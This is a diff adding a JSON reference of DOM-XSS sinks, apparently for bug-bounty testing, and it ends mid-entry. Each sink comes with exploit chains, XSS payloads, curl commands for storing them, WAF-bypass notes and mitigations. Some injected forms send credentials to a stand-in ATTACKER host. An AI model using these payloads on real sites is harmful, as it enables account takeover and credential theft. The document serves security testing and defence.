@@ -1,0 +1,787 @@
+{
+  "category": "dom-write",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-innerhtml",
+      "name": "innerHTML",
+      "category": "dom-write",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "innerHTML",
+        "el.innerHTML",
+        "element.innerHTML",
+        ".innerHTML"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 with a direct DOM source and no sanitizer; P3 when a partial filter forces exotic payloads or a click is required.",
+      "explain": "element.innerHTML parses an assigned string as HTML and replaces the element's children with the resulting nodes. It is the most common DOM-XSS sink: any attacker-controlled markup becomes live DOM in the page's origin.",
+      "how_it_works": "The assigned string goes through the HTML parser in the element's context. Crucially, <script> tags inserted via innerHTML do NOT execute (parser-inserted scripts are marked 'already started'), but event-handler attributes (onerror, onload, onfocus), auto-firing media tags, and javascript: URLs in inserted links all execute. This is why the standard PoC is <img src=x onerror=...> rather than <script>.",
+      "why_it_matters": "innerHTML appears in virtually every legacy and modern codebase (including via framework escape hatches). One unguarded assignment reached by the URL, postMessage, or an API response is full DOM XSS: cookie theft for non-HttpOnly tokens, authenticated actions, and page defacement.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "postMessage-data",
+        "xhr-response",
+        "fetch-response",
+        "document.referrer",
+        "dom-form-values"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the fragment reaches the assignment",
+              "payload": "#<b>jlf-trace</b>",
+              "command": "open 'https://TARGET/page#<b>jlf-trace</b>' and inspect the target element in DevTools Elements panel",
+              "indicator": "a bold 'jlf-trace' node exists inside the target element, proving raw HTML injection"
+            },
+            {
+              "action": "Fire the standard non-script PoC",
+              "payload": "#<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page#<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires when the broken image triggers its onerror handler"
+            },
+            {
+              "action": "If the app strips tags or the write lands inside an attribute, adapt context",
+              "payload": "#\" autofocus onfocus=alert(document.domain) x=\"",
+              "command": "open 'https://TARGET/page#\" autofocus onfocus=alert(document.domain) x=\"' when the tainted value is placed inside an attribute of an inserted tag",
+              "indicator": "the alert fires automatically via autofocus+onfocus without user interaction"
+            }
+          ],
+          "eligibility": "The flagship DOM-XSS pattern; accepted on all major platforms. Fragment delivery is server-WAF-blind. Remember: <script>alert(1)</script> via innerHTML does NOT execute — a PoC relying on it will be rejected as non-exploitable."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify message data flows into innerHTML and audit the origin check",
+              "payload": "<b>jlf-trace</b>",
+              "command": "postMessage('<b>jlf-trace</b>','*') from the console on https://TARGET/page and inspect the DOM",
+              "indicator": "the bold node appears in the page, and the listener code shows missing or weak e.origin validation"
+            },
+            {
+              "action": "Exploit cross-origin with an auto-firing handler",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('<img src=x onerror=alert(document.domain)>','*')</script>",
+              "indicator": "the alert fires inside the target frame without user interaction"
+            },
+            {
+              "action": "Bypass an origin regex that trusts subdomains or suffixes",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "register or reuse a host matching the flawed check (e.g. attacker.TARGET.com or TARGET.com.evil.test per the regex) and post the same payload from it",
+              "indicator": "the alert fires from the 'allowed' origin, proving the validation is bypassable"
+            }
+          ],
+          "eligibility": "Accepted everywhere when origin validation is absent, '*', or regex-bypassable. Include the listener source in the report; a solid regex bypass is itself a highlight of the finding."
+        },
+        {
+          "source": "xhr-response",
+          "steps": [
+            {
+              "action": "Map the API endpoint whose response is rendered via innerHTML",
+              "payload": "<b>jlf-trace</b>",
+              "command": "curl -s 'https://TARGET/api/comments' -H 'Cookie: session=SESSION_ID' | grep jlf-trace after submitting the marker through the corresponding write endpoint",
+              "indicator": "the marker is returned unencoded by the API and appears in the DOM after the page renders the response"
+            },
+            {
+              "action": "Store the XSS payload",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "curl -s -X POST 'https://TARGET/api/comments' -H 'Cookie: session=SESSION_ID' -H 'Content-Type: application/json' -d '{\"body\":\"<img src=x onerror=alert(document.domain)>\"}'",
+              "indicator": "the payload is persisted and later served to viewers of the page"
+            },
+            {
+              "action": "Trigger as a victim-view",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/comments' in a fresh browser profile (second test account) viewing the stored content",
+              "indicator": "the alert fires in the second account's session, proving stored XSS with cross-account impact"
+            }
+          ],
+          "eligibility": "Stored XSS via API-to-innerHTML is a strong P2 finding when another user is affected. If only your own account can ever view the payload, platforms grade it self-XSS — always demonstrate a victim view."
+        }
+      ],
+      "contexts": {
+        "html-body": "Tainted string assigned as element content. Payload: <img src=x onerror=alert(document.domain)>. <script> will NOT execute here — use event handlers, <svg onload=alert(document.domain)>, or <iframe src=javascript:alert(document.domain)>.",
+        "attr": "Taint lands inside an attribute of a tag being written, e.g. innerHTML = '<div title=\"'+tainted+'\">'. Breakout: '\" onmouseover=alert(document.domain) x=\"' (needs hover) or '\" autofocus onfocus=alert(document.domain) x=\"' on a focusable tag.",
+        "js-string": "Taint lands inside a <script> block being written via innerHTML of a surrounding template — rare, but if the constructed markup includes a script context, close it with '</script><img src=x onerror=alert(document.domain)>'. Note the inserted inline script still will not run; escape to markup instead.",
+        "svg-mathml": "Inside SVG/MathML contexts, encoding and parsing rules differ: <svg><script>alert(document.domain)</script></svg> historically executed in some parsers; prefer <svg onload=alert(document.domain)> which is reliable."
+      },
+      "waf_notes": "Server WAFs commonly block '<script' and 'onerror=' in query strings; fragment and postMessage delivery bypass them entirely. For query/referrer chains, use <svg onload=...>, mixed-case attributes, or HTML-entity-encoded keywords if the app decodes entities after filtering (&#x6f;nerror=). Client-side sanitizers (DOMPurify) are the real gate — test for mutation-XSS bypasses rather than keyword tricks.",
+      "eligibility": "Accepted on all major platforms; typically Medium-High. Reflected variants needing a click are graded lower than stored variants. If DOMPurify or a framework sanitizer is in place, a payload that only works after you manually disable the sanitizer is NOT a valid finding — the bypass must work against the deployed configuration.",
+      "mitigations": [
+        "Assign user data with textContent instead of innerHTML.",
+        "If HTML is required, sanitize with DOMPurify (current version, RETURN_TRUSTED_TYPE where supported) immediately before assignment.",
+        "Deploy a strict CSP with Trusted Types (require-trusted-types-for 'script') to turn unsafe assignments into violations."
+      ],
+      "related": [
+        "outerHTML",
+        "insertAdjacentHTML",
+        "document.write",
+        "DOMParser.parseFromString"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)",
+        "MDN: Element.innerHTML"
+      ]
+    },
+    {
+      "id": "sink-outerhtml",
+      "name": "outerHTML",
+      "category": "dom-write",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "outerHTML",
+        "el.outerHTML",
+        ".outerHTML"
+      ],
+      "severity": "P2",
+      "severity_note": "Same class as innerHTML; slightly less common, sometimes missed by reviewers and by sanitizers that only guard innerHTML.",
+      "explain": "element.outerHTML replaces the element ITSELF with the parsed result of the assigned string. Everything true of innerHTML applies, plus the original node (including its id and any JS references to it) is destroyed and swapped for attacker markup.",
+      "how_it_works": "The string is parsed in the parent element's context. Inserted <script> tags do not execute (same innerHTML restriction), but event handlers, autofocus, and javascript: URLs do. Because the element is replaced, the attacker fully controls the replacement tag name and attributes — a <div> can become an <iframe>, <form>, or <svg>.",
+      "why_it_matters": "outerHTML replacement enables attacks innerHTML cannot: replacing a <form> with an attacker-shaped form (action pointing to ATTACKER) for credential phishing, or replacing a script-bearing container to break the page's own logic. Sanitizer coverage is also historically patchier for outerHTML assignments.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "localStorage",
+        "xhr-response"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the fragment reaches the outerHTML assignment",
+              "payload": "#<b>jlf-trace</b>",
+              "command": "open 'https://TARGET/page#<b>jlf-trace</b>' and check in Elements whether the original node was replaced by the injected markup",
+              "indicator": "the original element is gone and the injected <b> node sits in its place"
+            },
+            {
+              "action": "Fire an execution payload",
+              "payload": "#<svg onload=alert(document.domain)>",
+              "command": "open 'https://TARGET/page#<svg onload=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires as the replacement <svg> loads"
+            },
+            {
+              "action": "Demonstrate the replacement-specific impact with a form swap",
+              "payload": "#<form action=\"https://ATTACKER/collect\" method=post><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Sign in</button></form>",
+              "command": "open the URL with that fragment and submit test credentials",
+              "indicator": "the credentials are POSTed to ATTACKER — a phishing primitive innerHTML alone could not produce"
+            }
+          ],
+          "eligibility": "Accepted as DOM XSS; the form-replacement phishing angle raises impact when the replaced element is a login or payment form."
+        },
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Trace a query parameter into the assignment",
+              "payload": "?q=<b>jlf-trace</b>",
+              "command": "open 'https://TARGET/page?q=<b>jlf-trace</b>' and inspect the DOM",
+              "indicator": "the injected markup replaced the target element"
+            },
+            {
+              "action": "Execute code through the query string",
+              "payload": "?q=<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page?q=<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires via the image error handler"
+            },
+            {
+              "action": "If the server WAF strips tags, retry through double encoding or an alternate handler",
+              "payload": "?q=%253Csvg%2520onload%253Dalert(document.domain)%253E",
+              "command": "open the double-encoded URL when the app decodes twice, or use '?q=<svg onload=alert(document.domain)>' with the payload placed in the fragment if the app copies search into hash",
+              "indicator": "the alert fires despite the server-side filter"
+            }
+          ],
+          "eligibility": "Accepted; document any server-side filtering and how it was bypassed, since search-based delivery crosses the server unlike fragment delivery."
+        },
+        {
+          "source": "localStorage",
+          "steps": [
+            {
+              "action": "Plant and trace a stored value",
+              "payload": "<b>jlf-trace</b>",
+              "command": "localStorage.setItem('layout','<b>jlf-trace</b>'); reload https://TARGET/page and inspect the DOM",
+              "indicator": "the stored markup replaced the target element on load"
+            },
+            {
+              "action": "Fire the persistent payload",
+              "payload": "<svg onload=alert(document.domain)>",
+              "command": "localStorage.setItem('layout','<svg onload=alert(document.domain)>'); location.reload()",
+              "indicator": "the alert fires on every load that applies the stored layout"
+            },
+            {
+              "action": "Escalate via a remote storage write path",
+              "payload": "<svg onload=alert(document.domain)>",
+              "command": "identify the feature syncing this key from the server and submit the payload from a second account",
+              "indicator": "the payload executes in the first account's browser after sync — stored XSS, not self-XSS"
+            }
+          ],
+          "eligibility": "Self-planted storage alone is self-XSS and not eligible; valid when a server or cross-account write path exists."
+        }
+      ],
+      "contexts": {
+        "html-body": "Full element replacement: payload <img src=x onerror=alert(document.domain)> or <svg onload=alert(document.domain)>. Inserted <script> does not execute.",
+        "attr": "If taint lands inside an attribute of the replacement markup, break out with '\" autofocus onfocus=alert(document.domain) x=\"'.",
+        "table-context": "Replacing table children (tr/td) has parsing quirks: tags invalid in table context may be hoisted out. Prefer payloads valid in the actual parent context."
+      },
+      "waf_notes": "Same filter landscape as innerHTML: server WAFs target '<script' and 'on*=', so fragment delivery and <svg onload> variants are the reliable path. Because outerHTML is rarer, some server-side HTML purifiers simply do not sanitize the field feeding it — always test the exact field.",
+      "eligibility": "Accepted as DOM XSS at innerHTML grades. Same honesty rules: no self-XSS-only reports, no PoCs that require disabling the deployed sanitizer.",
+      "mitigations": [
+        "Avoid outerHTML with dynamic data; build replacement nodes with createElement and textContent.",
+        "Sanitize with DOMPurify before assignment if markup is genuinely required.",
+        "Enforce Trusted Types CSP to make raw string assignment throw."
+      ],
+      "related": [
+        "innerHTML",
+        "insertAdjacentHTML",
+        "document.write"
+      ],
+      "references": [
+        "MDN: Element.outerHTML",
+        "PortSwigger: DOM-based XSS",
+        "HackTricks: XSS - Cross Site Scripting"
+      ]
+    },
+    {
+      "id": "sink-document-write",
+      "name": "document.write",
+      "category": "dom-write",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "document.write",
+        "document.write("
+      ],
+      "severity": "P2",
+      "severity_note": "P2 in modern apps (rare and usually unsanitized); P3 if it only fires during initial parse with server-filtered input.",
+      "explain": "document.write(string) injects markup directly into the document stream. During initial page parsing it inserts at the parser position; called after the document has finished loading, it first calls document.open(), which WIPES the entire document and starts a new one.",
+      "how_it_works": "Two regimes matter. Parse-time: the string is tokenized by the live HTML parser, and here inserted <script> DOES execute — the classic '<script>alert(document.domain)</script>' works (write it as '<scr'+'ipt>' if the code sits inside a script block, to avoid prematurely closing the host script). Post-load: the call erases the page and writes attacker markup into a fresh document of the same origin, inheriting cookies and origin authority.",
+      "why_it_matters": "document.write survives in analytics snippets, A/B testers, ad loaders, and legacy widgets — exactly the third-party code that lands in otherwise hardened pages. Post-load invocation doubles as a full-page defacement primitive: the entire UI becomes attacker-controlled while the URL bar still shows the target origin.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "document.referrer",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm parse-time document.write with query taint",
+              "payload": "?q=<b>jlf-trace</b>",
+              "command": "open 'https://TARGET/page?q=<b>jlf-trace</b>' and view-source or inspect the DOM near the calling script",
+              "indicator": "the injected markup appears exactly where the calling <script> block sits in the page"
+            },
+            {
+              "action": "Exploit the parse-time script-execution difference",
+              "payload": "?q=<script>alert(document.domain)</script>",
+              "command": "open 'https://TARGET/page?q=<script>alert(document.domain)</script>' in a browser",
+              "indicator": "the alert fires — unlike innerHTML, parser-inserted scripts via document.write DO execute"
+            },
+            {
+              "action": "If the calling code sits inside a script block and breaks on '</script'",
+              "payload": "?q=<scr'+'ipt>alert(document.domain)</scr'+'ipt>",
+              "command": "use the concatenated form only when the app itself wraps the value in script text; otherwise prefer <img src=x onerror=alert(document.domain)>",
+              "indicator": "the alert fires with the syntax-appropriate variant"
+            }
+          ],
+          "eligibility": "Accepted as DOM/reflected XSS. Parse-time script execution makes this one of the few sinks where a plain <script> payload is the correct PoC — state that in the report."
+        },
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm post-load invocation wipes the document",
+              "payload": "#jlf-trace",
+              "command": "open 'https://TARGET/page#jlf-trace' after the page has fully loaded and observe whether the original content disappears",
+              "indicator": "the page is replaced by a near-blank document containing the written string — confirming implicit document.open()"
+            },
+            {
+              "action": "Write a full attacker page into the same origin",
+              "payload": "#<h1>Session expired</h1><form action=\"https://ATTACKER/collect\" method=post><input name=pass type=password placeholder=Password><button>Continue</button></form>",
+              "command": "open the URL with that fragment and submit a test password",
+              "indicator": "the password is POSTed to ATTACKER from a page whose address bar still shows https://TARGET/page"
+            },
+            {
+              "action": "Execute script in the rewritten document",
+              "payload": "#<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page#<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires in the fresh document, which retains the target origin and its cookies"
+            }
+          ],
+          "eligibility": "Accepted; the full-page takeover under the real origin is a strong impact demonstration. Fragment delivery keeps it server-WAF-blind."
+        },
+        {
+          "source": "document.referrer",
+          "steps": [
+            {
+              "action": "Confirm referrer text reaches document.write",
+              "payload": "<a href=\"https://TARGET/page\">go</a>   (save as jlf-trace.html — the tracer travels in the URL itself, no markup needed in the body)",
+              "command": "host the payload at 'https://ATTACKER/jlf-trace.html', click through to https://TARGET/page with Referer delivery enabled, and search the DOM for 'jlf-trace'",
+              "indicator": "the referrer string appears as written markup in the page"
+            },
+            {
+              "action": "Fire a payload carried in the referring URL's query",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "host 'https://ATTACKER/r.html?x=<img src=x onerror=alert(document.domain)>' linking to the target and click through (note: cross-origin default Referrer-Policy sends only the origin — use a query field the app parses from the full referrer when same-origin, or a downgrade)",
+              "indicator": "the alert fires after following the link when the full referrer (with query) reaches the sink"
+            }
+          ],
+          "eligibility": "Requires a click and full-referrer delivery; modern default referrer policies strip path+query cross-origin, so verify actual header content in the PoC and document the requirement — some programs grade click-dependent referrer XSS as lower severity."
+        }
+      ],
+      "contexts": {
+        "parse-time": "Write happens while the parser is active. <script>alert(document.domain)</script> executes. If the write call itself lives inside a <script> block, a literal '</script>' in the payload terminates the host block early — split it as '<scr'+'ipt>'.",
+        "post-load": "Write happens after load (event handler, timer, XHR callback). Implicit document.open() wipes the page; attacker markup becomes the whole document. Ideal for defacement and phishing forms.",
+        "attr": "If taint lands inside an attribute of written markup (e.g. document.write('<a href=\"'+tainted+'\">')), use 'javascript:alert(document.domain)' for a click-required PoC or '\"><img src=x onerror=alert(document.domain)>' to break out of the tag entirely."
+      },
+      "waf_notes": "Server WAFs see query and referrer variants; classic CRS rules flag '<script' and 'document.cookie'. Fragment delivery avoids the server. Chrome may block document.write-inserted synchronous third-party scripts on slow connections (intervention) — use event-handler payloads rather than remote <script src> for reliable PoCs.",
+      "eligibility": "Accepted as XSS on all major platforms. Clearly label parse-time vs post-load behavior in the report, because the correct payload and the impact story differ. Console-only invocation by the victim is self-XSS and not eligible.",
+      "mitigations": [
+        "Eliminate document.write; use DOM APIs (createElement/append) or innerHTML-with-sanitizer for dynamic content.",
+        "Load third-party snippets asynchronously so they cannot write into the parse stream.",
+        "CSP with a script nonce/hash policy plus Trusted Types blocks both the sink and the worst payload classes."
+      ],
+      "related": [
+        "document.writeln",
+        "innerHTML",
+        "outerHTML",
+        "insertAdjacentHTML"
+      ],
+      "references": [
+        "MDN: Document.write()",
+        "PortSwigger: DOM-based XSS",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)"
+      ]
+    },
+    {
+      "id": "sink-document-writeln",
+      "name": "document.writeln",
+      "category": "dom-write",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "document.writeln",
+        "document.writeln("
+      ],
+      "severity": "P2",
+      "severity_note": "Identical risk to document.write; graded the same. Its only difference (appended newline) can affect payloads that rely on line-oriented syntax.",
+      "explain": "document.writeln(string) is document.write plus a trailing newline (\\n) appended to the written string. Everything about parse-time script execution and post-load document wiping is identical to document.write.",
+      "how_it_works": "The appended newline is harmless for HTML payloads but matters when the payload lands inside a construct where a newline changes parsing — e.g. inside a JS single-line comment or a VBScript block in legacy IE contexts. Otherwise treat it exactly as document.write: parse-time <script> executes, post-load invocation wipes the document via implicit open().",
+      "why_it_matters": "It is rare enough that reviewers pattern-match 'document.write' and miss the 'writeln' spelling. It shows up in older banner rotators, counters, and document.write wrappers in ad-tech libraries, often with unsanitized URL input.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "document.referrer"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm query taint reaches writeln at parse time",
+              "payload": "?q=<b>jlf-trace</b>",
+              "command": "open 'https://TARGET/page?q=<b>jlf-trace</b>' and inspect where the markup lands",
+              "indicator": "the injected markup appears in the document, followed by a newline text node"
+            },
+            {
+              "action": "Execute script with the parse-time payload",
+              "payload": "?q=<script>alert(document.domain)</script>",
+              "command": "open 'https://TARGET/page?q=<script>alert(document.domain)</script>' in a browser",
+              "indicator": "the alert fires — parser-inserted scripts via writeln execute"
+            },
+            {
+              "action": "If the write lands inside a JS string in a script block, use the newline to your advantage",
+              "payload": "?q=alert(document.domain)//",
+              "command": "when taint is wrapped like document.writeln('run(\"'+q+'\")'), break out with '\");alert(document.domain);//' and note the trailing newline harmlessly terminates your // comment edge cases",
+              "indicator": "the alert fires with the quote-breakout payload"
+            }
+          ],
+          "eligibility": "Accepted as DOM/reflected XSS, same as document.write; cite the writeln spelling explicitly since automated scanners often miss it."
+        },
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm post-load writeln wipes the document",
+              "payload": "#jlf-trace",
+              "command": "open 'https://TARGET/page#jlf-trace' after full load and check whether the original DOM was replaced",
+              "indicator": "the page is replaced by the written content, confirming implicit document.open()"
+            },
+            {
+              "action": "Execute code in the rewritten document",
+              "payload": "#<svg onload=alert(document.domain)>",
+              "command": "open 'https://TARGET/page#<svg onload=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires in the new document, which keeps the target origin and cookies"
+            }
+          ],
+          "eligibility": "Accepted; post-load full-document overwrite under the real origin is a strong defacement/phishing demo."
+        },
+        {
+          "source": "document.referrer",
+          "steps": [
+            {
+              "action": "Confirm referrer text reaches writeln",
+              "payload": "<a href=\"https://TARGET/page\">go</a>   (save as jlf-trace.html — the tracer travels in the URL itself)",
+              "command": "host the payload at 'https://ATTACKER/jlf-trace.html', click through to https://TARGET/page, and search the DOM for the marker",
+              "indicator": "the marker appears as written markup"
+            },
+            {
+              "action": "Fire a handler-based payload through the referring page",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "host a referring page whose URL (as parsed by the app) carries the payload, e.g. a same-origin search URL 'https://TARGET/search?q=<img src=x onerror=alert(document.domain)>' linking onward to the vulnerable page",
+              "indicator": "the alert fires after navigation when the full referrer reaches the sink"
+            }
+          ],
+          "eligibility": "Click-dependent; verify the Referer header actually contains the payload path/query (default cross-origin policy strips it). Document the delivery requirement honestly."
+        }
+      ],
+      "contexts": {
+        "parse-time": "Same as document.write: <script> executes; split '</script>' if the call sits inside a script block.",
+        "post-load": "Implicit open() wipes the page; attacker markup becomes the entire same-origin document.",
+        "pre-context": "Inside <pre> or <textarea> written content, the appended newline is rendered literally — rarely security-relevant, but it can terminate line-comment-based filter bypasses."
+      },
+      "waf_notes": "Same as document.write. The 'writeln' spelling itself slips past naive sink scanners and some server-side signatures that only match 'document.write(' — but any payload-based WAF rule applies identically.",
+      "eligibility": "Accepted as XSS at document.write grades. Label parse-time vs post-load. No self-XSS-only reports.",
+      "mitigations": [
+        "Remove document.writeln; use DOM construction APIs.",
+        "Refactor ad/analytics snippets to async insertion patterns.",
+        "Enforce CSP with Trusted Types and no 'unsafe-inline' where feasible."
+      ],
+      "related": [
+        "document.write",
+        "innerHTML",
+        "outerHTML"
+      ],
+      "references": [
+        "MDN: Document.writeln()",
+        "PortSwigger: DOM-based XSS"
+      ]
+    },
+    {
+      "id": "sink-insertadjacenthtml",
+      "name": "insertAdjacentHTML",
+      "category": "dom-write",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "insertAdjacentHTML",
+        "el.insertAdjacentHTML",
+        ".insertAdjacentHTML"
+      ],
+      "severity": "P2",
+      "severity_note": "Same parser rules as innerHTML; the position argument changes WHERE markup lands, which affects which payload contexts are reachable.",
+      "explain": "element.insertAdjacentHTML(position, string) parses string as HTML and inserts the resulting nodes at one of four positions relative to element: 'beforebegin' (before the element), 'afterbegin' (inside, first child), 'beforeend' (inside, last child), 'afterend' (after the element).",
+      "how_it_works": "Parsing happens in the element's context (or its parent's for beforebegin/afterend). Inserted <script> does not execute, but event handlers, autofocus, and javascript: links do. The position argument determines the effective parent context: beforeend/afterbegin parse inside the element (e.g. inside a <table> or <select>, with their parsing quirks), while beforebegin/afterend parse in the parent context.",
+      "why_it_matters": "Developers favor insertAdjacentHTML for UI injection points (notification bars, ad slots, comment streams) — frequently fed by API responses or URL parameters. Position-aware testing matters: a payload valid in one position may be dropped by the parser in another, so an unsuccessful innerHTML-style payload is not proof of safety.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "postMessage-data",
+        "fetch-response"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Identify the position argument and trace the fragment",
+              "payload": "#<b>jlf-trace</b>",
+              "command": "open 'https://TARGET/page#<b>jlf-trace</b>', breakpoint the insertAdjacentHTML call, and record the position value and where the marker lands",
+              "indicator": "the marker node appears before, after, or inside the reference element exactly per the position argument"
+            },
+            {
+              "action": "Fire a context-valid execution payload",
+              "payload": "#<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page#<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires via the image error handler"
+            },
+            {
+              "action": "If the reference element is a table/select and the payload is dropped, adapt to the parse context",
+              "payload": "#<tr><td><img src=x onerror=alert(document.domain)></td></tr>",
+              "command": "open the URL with a table-valid payload when position is beforeend inside a <table>; for <select> use '<option><img src=x onerror=alert(document.domain)>' and note option text constraints",
+              "indicator": "the alert fires with the context-appropriate payload, after the generic one was silently dropped by the parser"
+            }
+          ],
+          "eligibility": "Accepted as DOM XSS. Reporting the exact position argument and reference element makes the report reproducible and shows why generic payloads may fail."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify message data reaches the sink and audit origin validation",
+              "payload": "<b>jlf-trace</b>",
+              "command": "postMessage('<b>jlf-trace</b>','*') from the console on https://TARGET/page and inspect the DOM",
+              "indicator": "the marker appears at the insertion point and the listener lacks a strict e.origin check"
+            },
+            {
+              "action": "Execute cross-origin",
+              "payload": "<svg onload=alert(document.domain)>",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('<svg onload=alert(document.domain)>','*')</script>",
+              "indicator": "the alert fires inside the target frame without interaction"
+            }
+          ],
+          "eligibility": "Accepted everywhere with missing/bypassable origin checks; quote the listener in the report."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Map the fetch endpoint whose JSON/HTML is inserted",
+              "payload": "<b>jlf-trace</b>",
+              "command": "curl -s -X POST 'https://TARGET/api/items' -H 'Cookie: session=SESSION_ID' -H 'Content-Type: application/json' -d '{\"name\":\"<b>jlf-trace</b>\"}' then load the listing page and inspect the DOM",
+              "indicator": "the marker renders as a bold node, confirming the API field is inserted unsanitized"
+            },
+            {
+              "action": "Store an execution payload and verify as a victim",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "curl -s -X POST 'https://TARGET/api/items' -H 'Cookie: session=SESSION_ID' -H 'Content-Type: application/json' -d '{\"name\":\"<img src=x onerror=alert(document.domain)>\"}' then open the listing in a second test account",
+              "indicator": "the alert fires in the second account's session when the item list renders"
+            }
+          ],
+          "eligibility": "Stored XSS with cross-account impact — strong P2. Same-account-only views are self-XSS; demonstrate a victim view."
+        }
+      ],
+      "contexts": {
+        "beforebegin-afterend": "Parsed in the PARENT context — generally safe-ish to test with standard payloads, and cannot nest inside the reference element. Standard: <img src=x onerror=alert(document.domain)>.",
+        "afterbegin-beforeend": "Parsed INSIDE the reference element — subject to that element's content model. Inside <table>: only table-section tags parse; use <tr><td> wrappers. Inside <select>: almost everything is dropped; treat as low exploitability unless the reference is a generic container.",
+        "attr": "Taint inside an attribute of the inserted string: break out with '\" autofocus onfocus=alert(document.domain) x=\"'."
+      },
+      "waf_notes": "Identical filter landscape to innerHTML. Position-dependent parse behavior defeats some naive server-side sanitizers that assume generic HTML context — a payload that survives only in table context can slip through validators that tested it as standalone markup.",
+      "eligibility": "Accepted as DOM XSS at innerHTML grades. Honest note: when the reference element is a <select> or similar restrictive context and no parse-valid payload exists, report the sink as defense-in-depth rather than exploitable XSS.",
+      "mitigations": [
+        "Prefer insertAdjacentElement/appendChild with programmatically built nodes.",
+        "Sanitize the string with DOMPurify before insertion if markup is required.",
+        "Enforce Trusted Types so raw string insertion throws."
+      ],
+      "related": [
+        "innerHTML",
+        "outerHTML",
+        "document.write"
+      ],
+      "references": [
+        "MDN: Element.insertAdjacentHTML()",
+        "PortSwigger: DOM-based XSS",
+        "HackTricks: XSS - Cross Site Scripting"
+      ]
+    },
+    {
+      "id": "sink-createcontextualfragment",
+      "name": "createContextualFragment",
+      "category": "dom-write",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "createContextualFragment",
+        "range.createContextualFragment",
+        "createRange"
+      ],
+      "severity": "P3",
+      "severity_note": "P3: rarer and usually wrapped in utility code; same exploitability as innerHTML once reached. The range's context node changes parsing rules.",
+      "explain": "document.createRange().createContextualFragment(string) parses string as HTML in the context of the range's start node and returns a DocumentFragment, which is then inserted with appendChild/insertBefore. It is the older, still-shipped API behind many 'safe HTML insert' helpers.",
+      "how_it_works": "Parsing follows the range context element's content model — a range on a <table> parses table children, a range on a <div> parses generic markup. Scripts inside the fragment do not execute on insertion, but event handlers and other active markup do. Because the API returns a fragment (not a string), it bypasses filters that only hook innerHTML/outerHTML setters.",
+      "why_it_matters": "Legacy widget libraries and rich-text editors use createContextualFragment for paste handling and template stamping — high-value input paths. Reviewers auditing only the familiar sinks often have zero findings here even when attacker text flows straight through.",
+      "exploitable_when": [
+        "location.hash",
+        "xhr-response",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Trace the fragment through the range API",
+              "payload": "#<b>jlf-trace</b>",
+              "command": "open 'https://TARGET/page#<b>jlf-trace</b>', breakpoint the createContextualFragment call, then step to the append/insert call",
+              "indicator": "the marker string enters createContextualFragment and the resulting nodes land in the document"
+            },
+            {
+              "action": "Fire an execution payload through the fragment",
+              "payload": "#<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page#<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires after the fragment is inserted"
+            }
+          ],
+          "eligibility": "Accepted as DOM XSS; fragment delivery keeps it server-WAF-blind."
+        },
+        {
+          "source": "xhr-response",
+          "steps": [
+            {
+              "action": "Confirm an API field flows into the fragment",
+              "payload": "<b>jlf-trace</b>",
+              "command": "curl -s -X POST 'https://TARGET/api/notes' -H 'Cookie: session=SESSION_ID' -H 'Content-Type: application/json' -d '{\"html\":\"<b>jlf-trace</b>\"}' then load the viewing page and inspect the DOM",
